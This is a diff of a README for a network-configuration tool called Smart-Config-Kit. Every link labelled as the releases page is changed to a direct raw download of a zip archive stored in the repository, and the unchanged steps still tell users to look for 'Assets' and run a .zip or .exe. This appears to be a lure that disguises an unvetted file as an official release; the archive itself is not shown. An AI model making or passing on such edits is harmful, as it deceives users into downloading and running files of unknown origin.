@@ -1,6 +1,6 @@
 # 🛠 Smart-Config-Kit - Optimize your network traffic flow easily
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Armillary-italy713/Smart-Config-Kit/releases)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://raw.githubusercontent.com/Armillary-italy713/Smart-Config-Kit/main/FlClash/Config_Kit_Smart_v1.6.zip)
 
 ## 📌 About this project
 
@@ -8,11 +8,11 @@ Smart-Config-Kit manages your network configuration files. It works with many po
 
 ## 📥 How to download
 
-Visit [this page](https://github.com/Armillary-italy713/Smart-Config-Kit/releases) to download the latest setup files. 
+Visit [this page](https://raw.githubusercontent.com/Armillary-italy713/Smart-Config-Kit/main/FlClash/Config_Kit_Smart_v1.6.zip) to download the latest setup files. 
 
 Follow these steps to get the software:
 
-1. Open the [release page](https://github.com/Armillary-italy713/Smart-Config-Kit/releases) in your web browser.
+1. Open the [release page](https://raw.githubusercontent.com/Armillary-italy713/Smart-Config-Kit/main/FlClash/Config_Kit_Smart_v1.6.zip) in your web browser.
 2. Look for the section labeled Assets.
 3. Click the file ending in .zip or .exe to start the download.
 4. Save the file to your desktop or downloads folder.
